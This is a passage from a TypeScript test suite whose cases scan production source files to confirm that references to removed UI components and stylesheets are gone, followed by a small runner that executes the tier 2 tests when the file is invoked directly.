
    it('F31-E2: [source-level] Zero references to the Pager wrapper (PagerDuty text does not count)', async () => {
      const hits: string[] = [];
      for (const file of scanProductionSources()) {
        if (/\bPager\b/.test(fs.readFileSync(file, 'utf8'))) hits.push(file);
      }
      expect(hits.length).toBe(0);
    });

    it('F31-E3: [source-level] Zero references to ViewLoadingSkeleton in production source', async () => {
      const hits: string[] = [];
      for (const file of scanProductionSources()) {
        if (fs.readFileSync(file, 'utf8').includes('ViewLoadingSkeleton')) hits.push(file);
      }
      expect(hits.length).toBe(0);
    });

    it('F31-E4: [source-level] Zero references to the purged fluent2 stylesheet', async () => {
      const hits: string[] = [];
      for (const file of scanProductionSources()) {
        if (fs.readFileSync(file, 'utf8').includes('fluent2')) hits.push(file);
      }
      expect(hits.length).toBe(0);
    });

    it('F31-E5: [source-level] Zero references to the purged jxui.css stylesheet', async () => {
      const hits: string[] = [];
      for (const file of scanProductionSources()) {
        if (fs.readFileSync(file, 'utf8').includes('jxui.css')) hits.push(file);
      }
      expect(hits.length).toBe(0);
    });
  }, { tier: 'tier2', featureId: 'F31' });

  await Promise.all(pendingStoreCalls);
}

const isDirectExecution =
  process.argv[1]?.endsWith('tier2-boundary-corner.test.ts') ||
  process.argv[1]?.endsWith('tier2-boundary-corner.test.js');

if (isDirectExecution) {
  runTier2Tests()
    .then(async () => {
      const { printSummary } = await import('./harness.js');
      const summary = printSummary('Tier 2 Test Suite');
      if (summary.failed > 0) process.exit(1);
    })
    .catch((err) => {
      console.error('Tier 2 runner failed:', err);
      process.exit(1);
    });
}
